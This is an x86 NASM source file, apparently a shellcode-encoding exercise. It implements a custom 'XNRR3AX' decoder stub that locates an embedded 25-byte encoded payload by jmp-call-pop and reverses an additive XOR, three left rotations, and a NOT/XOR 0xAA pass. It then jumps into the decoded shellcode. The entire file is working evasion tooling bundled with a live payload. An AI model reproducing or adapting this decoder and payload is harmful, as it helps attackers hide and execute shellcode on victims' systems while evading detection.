;
; Author 	: RIZAL MUHAMMED (UB3RSiCK)
; Desc		: XNRR3AX Decoder
; Note		: XORRED WITH 0XAA	
; Filename	: xnrr3ax-decoder.nasm

; 1) Reverse Additive XOR
; 2) Rotate Left 3 times
; 3) Apply XOR, NOT operation on each byte
; 4) Jump to decoded shellcode 


global _start

section .text
	_start:
		
		jmp short get_shellcode_addr
	
		shellcode_addr:
			
			pop esi				; pointer to shellcode 
			
			xor eax, eax
			xor ebx, ebx
			xor ecx, ecx			; clear registers needed
			xor edx, edx
			
			push esi			; esi has pointer to shellcode 
			pop edi				; clears edi and saves pointer to shellcode in edi

;################################################################################################
	
			; Reverse Additive XOR
			
			mov cl, l_sc - 1		; clears cl and init with loop counter

			mov bl, byte [esi] 		; move first byte of shellcode to ebx

			decoder:
				mov al, byte [esi + 1]	; save a copy of byte [esi + 1] in al, used in next xor operation
				xor byte [esi + 1], bl	; xor byte [esi + 1] with encoded byte in bl
				mov bl, al		; [esi +1] is decoded now, for next stage we require encoded value which is saved in al
				inc esi
				loop decoder

			mov esi, edi			;restore pointer to shellcode in esi
;################################################################################################

			; Rotate left 3 times
			
			mov cl, 0x3			; rotate left 3 times
			shift:	
				push esi			; save pointer to shellcode on stack for later use
				mov bl, byte [esi]		; save byte [esi] in bl

				mov dl, l_sc-1		; shift_loop runs len(shellcode) - 1 times
				shift_loop:

					lea edi, [esi]		; save address of [esi] in edi
					mov al, byte [esi +1]	; move byte [esi + 1] to al
					mov byte [edi], al	; move byte in al to [esi]
					inc esi			; increment esi
					dec dl			; decrement shift_loop counter
					jnz shift_loop
				mov byte [esi], bl		; the first element is saved in the last
				pop esi				; move shellcode address to esi
				loop shift 	

;################################################################################################
			
			; Apply XOR and NOT on each byte

			mov cl, l_sc			; move length of shellcode to ecx
			
			decode_loop:
				not byte [esi]			; Apply NOT operation 
				xor byte [esi], 0xAA		; XOR with 0xAA
				inc esi
				
				loop decode_loop

				jmp short shellcode		; Decoding is complete, jump to the shellcode


		get_shellcode_addr:
			call shellcode_addr
			shellcode: db 0x5e,0xc6,0x13,0x77,0xe2,0xe7,0xda,0xa0,0xda,0xfc,0xc1,0xfc,0x86,0xb1,0x8d,0xb6,0x6a,0xdc,0xd9,0x05,0xb2,0xb4,0x68,0xdc,0x39
			l_sc equ $-shellcode

